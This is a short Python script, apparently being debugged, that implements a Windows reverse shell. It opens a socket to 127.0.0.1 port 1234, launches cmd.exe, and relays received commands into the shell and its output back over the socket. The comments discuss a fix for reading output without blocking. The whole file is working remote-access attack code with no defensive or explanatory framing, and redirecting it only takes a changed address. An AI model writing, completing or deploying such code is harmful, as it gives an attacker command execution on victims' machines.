import socket
import subprocess
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 1234))

# shell=True is important for Windows commands
p = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

while True:
    # 1. Receive command
    data = s.recv(1024)
    if not data: break
    
    # 2. Execute command
    p.stdin.write(data + b"\n")
    p.stdin.flush()
    
    # 3. The Fix: Give the process a moment to finish, then read
    time.sleep(0.5) 
    # Use .peek() or read1() to avoid the 1024-byte block
    output = p.stdout.read1(4096) 
    s.send(output)